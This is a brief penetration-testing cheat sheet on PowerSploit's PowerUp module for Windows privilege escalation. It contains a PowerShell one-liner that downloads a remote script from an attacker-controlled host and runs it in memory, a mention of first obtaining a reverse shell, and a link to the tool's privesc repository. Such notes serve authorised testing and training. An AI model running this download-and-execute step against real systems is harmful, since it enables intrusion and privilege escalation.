# PowerSploit Helpsheet

First load into memory unless you have WinRM access and are using [[Evil-winrm-Cheatsheet]]
```powershell
# Obtain powershell reverse shell on then execute powershell 
IEX(New-Object Net.WebClient).downloadString('http://$ip/PowerUp.ps1')
Invoke-AllChecks
```

For individual checks, exploits, hijacks and enumeration see this  page: 
[https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)